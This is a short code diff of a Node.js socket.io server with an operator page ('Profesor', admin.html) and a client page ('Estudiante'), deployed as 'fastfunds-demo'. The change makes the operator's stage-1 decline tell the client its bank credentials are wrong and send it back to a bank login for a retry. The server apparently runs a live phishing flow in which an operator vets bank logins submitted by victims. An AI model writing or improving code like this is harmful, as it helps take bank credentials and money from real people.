@@ -63,14 +63,14 @@ io.on('connection', (socket) => {
     }
   });
 
-  // Profesor: Declinar etapa 1
+    // Profesor: Declinar etapa 1 → ahora devuelve al cliente al login del banco
   socket.on('declinarEtapa1', (requestId) => {
     const request = pendingRequests.find(r => r.id === requestId);
-    if (request) {
-      io.to(request.socketId).emit('rechazadoEtapa1');
+    if (request && request.estado === 'esperando_aprobacion1') {
+      io.to(request.socketId).emit('credencialesBancoIncorrectas');
       pendingRequests = pendingRequests.filter(r => r.id !== requestId);
       io.emit('listaActualizada', pendingRequests);
-      console.log(`❌ Etapa 1 declinada: ${request.nombre}`);
+      console.log(`🔄 Etapa 1 declinada (reintento banco): ${request.nombre}`);
     }
   });
 
@@ -108,10 +108,8 @@ io.on('connection', (socket) => {
 
 // ←←← ESTO ES LO MÁS IMPORTANTE PARA RENDER
 const PORT = process.env.PORT || 3000;
-const publicURL = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
-
 server.listen(PORT, () => {
   console.log(`🚀 Servidor listo en puerto ${PORT}`);
-  console.log(`   Estudiante → ${publicURL}`);
-  console.log(`   Profesor   → ${publicURL}/admin.html`);
+  console.log(`   Estudiante → https://fastfunds-demo.onrender.com`);
+  console.log(`   Profesor   → https://fastfunds-demo.onrender.com/admin.html`);
 });
